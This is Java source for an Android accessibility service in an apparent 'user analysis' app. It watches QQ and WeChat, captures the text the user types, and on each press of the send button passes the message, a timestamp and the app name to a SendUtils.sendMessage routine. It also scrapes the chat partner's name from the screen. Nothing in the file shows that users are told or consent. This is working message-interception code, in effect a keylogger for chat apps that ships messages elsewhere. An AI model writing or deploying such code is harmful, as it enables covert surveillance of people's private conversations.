package com.example.useranalysisapp.service;

import android.accessibilityservice.AccessibilityService;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.telephony.mbms.FileInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.TextView;
import android.widget.Toast;

import com.example.useranalysisapp.utils.SendUtils;

import org.w3c.dom.Text;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.util.List;

public class MessageService extends AccessibilityService {

    private String inputString = "[]";
    private String chatPerson = "unknown";

    public MessageService() {
    }


    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        String packageName = event.getPackageName().toString();

        if(packageName.equals("com.tencent.mobileqq") || packageName.equals("com.tencent.mm")){

            switch(eventType){
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    inputString = event.getText().toString();

                    break;
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    if(!event.getText().toString().equals("[发送]")){
                        break;
                    }

                    inputString = inputString.substring(1, inputString.length() - 1).trim();

                    if(inputString.length() > 0){
                        final long sendTime = System.currentTimeMillis() / 1000;

                        /*
                        String path = this.getExternalFilesDir("log").getAbsolutePath();
                        File newFile = new File(path + File.separator + "log.txt");
                        OutputStream os = null;
                        String content = insideInputString + " " + sendTime + " " + chatPerson;

                        Log.e(TAG, DEBUG_TVC+ content);

                        try {
                            os = new FileOutputStream(newFile);
                            os.write(content.getBytes());
                            os.flush();
                        } catch (IOException e) {
                            e.printStackTrace();
                        } finally {
                            try {
                                if(os!=null) {
                                    os.close();
                                }
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }

                         */
                        if(packageName.equals("com.tencent.mobileqq")) {
                            SendUtils.sendMessage(inputString, sendTime, "QQ");
                        } else {
                            SendUtils.sendMessage(inputString, sendTime, "微信");
                        }
                    }

                    break;

                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                    List<AccessibilityNodeInfo> chatPersonList = null;
                    if(packageName.equals("com.tencent.mobileqq")) {
                        chatPersonList = rootNode.findAccessibilityNodeInfosByViewId("com.tencent.mobileqq:id/title");
                    } else {
                        //rootNode.findAccessibilityNodeInfosByText("")
                        chatPersonList = rootNode.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/gas");
                    }
                    if(chatPersonList.size() != 0){
                        AccessibilityNodeInfo chatPersonInfo = chatPersonList.get(0);
                        CharSequence chatPersonText = chatPersonInfo.getText();
                        if(chatPersonText != null){
                            chatPerson = chatPersonText.toString();
                        }
                    }
                    break;
                default:
                    break;
            }
        }
    }

    @Override
    public void onInterrupt() {

    }
}